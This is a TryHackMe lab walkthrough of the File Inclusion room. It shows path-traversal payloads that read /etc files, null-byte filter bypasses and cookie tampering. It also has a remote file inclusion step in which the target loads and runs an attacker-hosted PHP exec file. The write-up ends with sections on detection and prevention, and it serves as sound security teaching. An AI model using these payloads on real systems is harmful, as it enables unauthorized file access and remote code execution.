# 🛡️ TryHackMe - File Inclusion Walkthrough

This walkthrough documents my approach and solutions to the File Inclusion room on TryHackMe:  
🔗 https://tryhackme.com/room/fileinc

---

## 🧠 Overview

The room introduces concepts around **Local File Inclusion (LFI)** and **Remote File Inclusion (RFI)** vulnerabilities. It emphasizes techniques like input tampering, bypassing filters, and understanding how web applications handle file loading mechanisms.

🖥️ Make sure the attached VM is running and visit:  
http://10.10.68.207/challenges/index.php

---

## 🔍 General LFI Testing Methodology

1. 🔎 Find entry points in GET, POST, COOKIE, or HTTP header values.  
2. ✅ Test with valid inputs to understand baseline behavior.  
3. ⚠️ Send invalid/suspicious inputs (e.g. `../../../../etc/passwd`) to probe for weaknesses.  
4. 🧰 Use external tools like Burp Suite to inspect and modify raw requests.  
5. 🚨 Look for error messages or behavior changes that reveal file paths or vulnerabilities.  
6. 🛠️ Understand and bypass filters, like NULL byte injection (`%00`) or filename extension restrictions.

---

## 🔓 Challenge 1: Basic LFI via POST Parameter

🗨️ The page says: _"The input form is broken! You need to send POST request with file parameter!"_

![Screenshot 369](./Screenshot%20(369).png)

### 💡 What I did:
- Inspected the page and modified the form to use POST:  
  `<form action="#" method="POST">`  
  ![Screenshot 370](./Screenshot%20(370).png)  
  ![Screenshot 371](./Screenshot%20(371).png)  
- Submitted the value: `../../../../etc/flag1`  
  ![Screenshot 372](./Screenshot%20(372).png)  
- **Flag1 printed on screen**  
  ![Screenshot 373](./Screenshot%20(373).png)

---

## 🍪 Challenge 2: Cookie-Based LFI + NULL Byte Injection

🗨️ Initial screen says: _"Welcome Guest! Only admins can access this page!"_  
![Screenshot 374](./Screenshot%20(374).png)

### 💡 What I did:
- Opened browser dev tools → Storage tab → Cookies  
  ![Screenshot 375](./Screenshot%20(375).png)  
- Changed cookie value from `Guest` → `Admin`  
  ![Screenshot 376](./Screenshot%20(376).png)  
- Page changed but included a file called `Admin`  
  ![Screenshot 377](./Screenshot%20(377).png)  
- Changed the cookie to: `../../../../etc/flag2%00`  
  ![Screenshot 379](./Screenshot%20(379).png)  
- **Flag2 displayed.**

---

## 🔁 Challenge 3: POST-Based LFI with Filtering Bypass

📝 Page looks like a normal input form.  
![Screenshot 380](./Screenshot%20(380).png)

### 💡 What I tried:
- Changed form to POST (like Challenge 1)  
  ![Screenshot 381](./Screenshot%20(381).png)
- Tried path traversal with and without NULL byte: `../../../../etc/flag3%00`  
  ![Screenshot 382](./Screenshot%20(382).png)  
  ![Screenshot 383](./Screenshot%20(383).png)  
- Didn’t work via browser, so I used **Burp Suite Interceptor**  
  ![Screenshot 384](./Screenshot%20(384).png)  
- Modified request method to POST and resent payload  
  ![Screenshot 385](./Screenshot%20(385).png)  
- **Burp Suite bypassed the include logic and revealed Flag3.**

---

## 🥇 Challenge 4: Remote File Inclusion (RFI)
----------------------------------------
- Navigated to: http://10.10.68.207/playground.php
- Setup:
    - Ran local Python server: python3 -m http.server
    - Created host.txt:
        <?php
        print exec('hostname');
        ?>
![Screenshot 366](./Screenshot%20(386).png)
    - Loaded via browser:
      http://10.10.68.207/playground.php?file=http://10.10.44.82:8000/host.txt
![Screenshot 366](./Screenshot%20(387).png)
    - Flag printed to screen via RFI.
![Screenshot 366](./Screenshot%20(388).png)

🛡️ Detection, Mitigation, and Prevention of File Inclusion
--------------------------------------------------------

🧭 Detection:
- Monitor for suspicious file access patterns (e.g. ../, .php, remote URLs).
- Look for anomalous requests with odd user-agent or cookies.
- Set up WAF rules to catch common LFI/RFI payloads.

🛠️ Mitigation:
- Never include files based on user input.
- Whitelist allowed filenames or use strict mappings instead.
- Disable remote URL includes in PHP (allow_url_include = Off).

🔐 Prevention:
- Use secure coding practices—avoid include($_GET['file']) or similar.
- Sanitize all input using allowlists and strict validation.
- Keep error messages generic to avoid exposing paths.

Flags Captured
--------------
✅ Flag1  
✅ Flag2  
✅ Flag3  
✅ Final RFI Challenge Flag
